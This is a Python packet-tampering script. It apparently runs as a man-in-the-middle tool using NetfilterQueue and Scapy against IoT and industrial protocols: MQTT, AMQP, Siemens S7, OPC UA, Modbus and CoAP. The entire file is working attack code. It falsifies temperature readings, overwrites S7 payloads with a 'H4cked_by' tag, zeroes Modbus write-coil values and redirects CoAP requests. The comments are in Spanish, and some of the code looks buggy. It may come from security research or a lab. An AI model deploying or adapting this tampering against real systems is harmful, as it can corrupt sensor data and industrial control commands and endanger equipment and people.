import os,sys,random
from netfilterqueue import NetfilterQueue
from scapy.all import * 
from scapy.layers import *
import re
import string
def cleaner_regex_amqp(string):
    num = True
    result = re.sub("[^0-9]", "", string)
    try:
        result = int(result)
    except:
        num = False

    return result,num

def get_random_string(length):
    # With combination of lower and upper case
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    # print random string
    return result_str


#Analazing and modifying packets
def modify(packet):
    pkt = IP(packet.get_payload())
    #MQTT Manipulation packets
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 1883:
        if pkt.haslayer(Raw):
            load = pkt[TCP][Raw].load
            if load.__contains__(b'temp:'):
                try:
                    print("Empezamos a modificar")
                    load = load.decode("utf-8")
                    temp = load.split(":")[1]
                    load = load.replace(temp,str(random.randint(-5,20)))
                    str.encode(load)
                    pkt[TCP][Raw].load = load
                    print("Paquete modificado")
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    packet.set_payload(bytes(pkt))
                    print("Se va a enviar el paquete")
                    print(str(packet))
                except Exception as e:
                    print(e)
                    packet.accept()



    #AMQP Manipulation packets
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 5672:
        if pkt.haslayer(Raw):
            load = pkt[TCP][Raw].load
            if load[0] == 2: #Byte 0 indicates the type of message (2 == publish_message)
                long = load[28]
                num = load[29:29+long]
                mod_num = bytes(chr(int(num.decode('utf-8'))).encode()*long)
                print(mod_num)
                load = bytes(load[:29])+mod_num+b'\xce' #Make the new load 
                pkt[TCP][Raw].load = load
                print("Paquete modificado")
                #Resets the checksum to avoid problems
                del pkt[IP].chksum
                del pkt[TCP].chksum
                #Change the original packet
                packet.set_payload(bytes(pkt))
                print("Se va a enviar el paquete")
                print(str(packet))
    
    #S7 Manipulation packets
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 1102:
        print(pkt[TCP].show())
        if pkt.haslayer(Raw):
            load = pkt[TCP][Raw].load
            if len(load) > 50:
                load = bytes(load[:35]) + 'H4cked_by_C4denaX_;P'.encode()
                pkt[TCP][Raw].load = load
                del pkt[IP].chksum
                del pkt[TCP].chksum
                packet.set_payload(bytes(pkt))
                print("Se envia el nuevo paquete")
                print(str(packet))
    #OPC UA Manipulation packets
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 4840:
        print(pkt[TCP].show())
        if pkt.haslayer(Raw):
            load = pkt[TCP][Raw].load
            if load[:5] == b'MSGFX':
                print(load[73:])
                load = bytes(load[:62]) + str(random.randint(1000000001,9999999999)).encode() + bytes(load[72:])  # load[62:72]
                #print(pkt[TCP][Raw].load)
                #print(load)
                pkt[TCP][Raw].load = load
                del pkt[IP].chksum
                del pkt[TCP].chksum
                packet.set_payload(bytes(pkt))
                print("Paquete Enviado Modificado")
                print(str(packet))
    #Modbus Manipulation Writer
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport== 502:
        print(pkt[TCP].show())
        if pkt.haslayer(Raw):
            load = pkt[TCP][Raw].load
            if load[7] == 5:
                load = bytes(load[:10]) + b'\x00\x00'
            pkt[TCP][Raw].load = load
            del pkt[IP].chksum
            del pkt[TCP].chksum
            packet.set_payload(bytes(pkt))
            print("Se ha enviado el paquete modficado")
            print(str(packet))
    #COAP Packet Manipulation of Get and Put Methods
    if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == 5683:
        orig_load = pkt[UDP][Raw].load
        #If message is typed as GET message
        if orig_load[1] == 1:
            #print(pkt[UDP].show())
            final_directory = b'\xb4time' #New direction of get method (Load was studied before to get this byte secuence)
            final_load = orig_load[:6] + final_directory
            pkt[UDP][Raw].load = final_load
            #First update and modified the new length of the packet to avoid retransmissions
            pkt[UDP].len = pkt[UDP].len - abs(len(orig_load)-len(final_load))
            pkt[IP].len = pkt[IP].len - abs(len(orig_load)-len(final_load))
            print("Paquete modificado")
            #Resets the checksum to avoid problems
            del pkt[IP].chksum
            del pkt[UDP].chksum
            #Change the original packet
            packet.set_payload(bytes(pkt))
            print("Se va a enviar el paquete")
            print(str(packet))
        #If message is typed as PUT message     
        if orig_load[1] == 3:
            new_payload = b'This payload has no be modified by a cracker:D' #The message has the same len to avoid changing the len of the total message
            final_load= orig_load[:19] + new_payload
            pkt[UDP][Raw].load = final_load
            print("Paquete modificado")
            #Resets the checksum to avoid problems
            del pkt[IP].chksum
            del pkt[UDP].chksum
            #Change the original packet
            packet.set_payload(bytes(pkt))
            print("Se va a enviar el paquete")
            print(str(packet))
      
    packet.accept()



#Main function 
if __name__ == "__main__":
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, modify)
    try:
        print ("[*] waiting for data")
        nfqueue.run()
    except KeyboardInterrupt:
        nfqueue.unbind()
    
